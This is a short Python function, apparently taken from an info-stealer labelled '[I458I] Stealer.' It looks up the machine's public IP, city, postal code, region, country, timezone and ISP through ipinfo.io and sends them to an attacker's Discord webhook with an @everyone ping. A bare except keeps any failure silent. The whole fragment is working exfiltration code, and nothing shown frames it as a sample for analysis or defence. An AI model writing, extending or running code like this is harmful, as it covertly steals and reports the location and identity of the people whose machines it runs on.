def ip():
 try:
  z = requests.get("https://ipinfo.io/json").json()
  ip = z["ip"]
  ip = str(ip)
  country = z["country"]
  region = z["region"]
  city = z["city"]
  org = z["org"]
  post = z["postal"]
  tz = z["timezone"]
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&", content="||@everyone||")
  y = DiscordEmbed(title=":globe_with_meridians: IP Info")
  y.add_embed_field(name="IP INFORMATION", value=f"**:wireless: | {ip}**\n\n **:round_pushpin: | {city}, {post}, {region} {country} {tz}** \n\n **:bookmark_tabs: | {org}**")
  x.add_embed(y)
  x.execute()
 except:pass